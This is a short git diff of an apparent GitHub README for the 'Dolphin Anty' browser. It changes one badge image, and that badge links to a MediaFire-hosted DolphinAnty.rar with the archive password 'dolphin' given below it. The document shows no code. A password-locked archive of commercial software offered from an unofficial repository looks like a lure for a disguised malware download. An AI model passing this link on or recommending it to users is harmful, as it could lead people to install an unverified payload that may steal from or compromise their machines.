@@ -22,7 +22,7 @@ Dolphin Anty has several features that make it an ideal browser for social media
 
 ![1-2](https://github.com/LightingSoftware/Dolphin-Anty/assets/146416295/59c1c5a2-3d1b-4844-b115-255111880517)
 
-[![Dolphin](https://imgur.com/a/U3JX8RG)](https://www.mediafire.com/file/khfjwakgoexxcuo/DolphinAnty.rar)
+[![Dolphin](https://i.imgur.com/YVjLz5j.png)](https://www.mediafire.com/file/khfjwakgoexxcuo/DolphinAnty.rar)
 
 # 🔒Password: dolphin
 
